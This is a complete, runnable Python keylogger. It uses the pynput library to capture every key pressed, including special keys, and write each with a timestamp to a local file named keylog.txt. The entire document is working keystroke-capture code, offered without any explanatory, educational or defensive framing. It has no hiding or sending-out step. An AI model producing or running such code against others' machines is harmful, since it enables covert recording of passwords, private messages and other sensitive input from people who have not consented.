from pynput import keyboard
import logging

# Save logs to this file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# What to do when a key is pressed
def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key: {0}'.format(key))

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

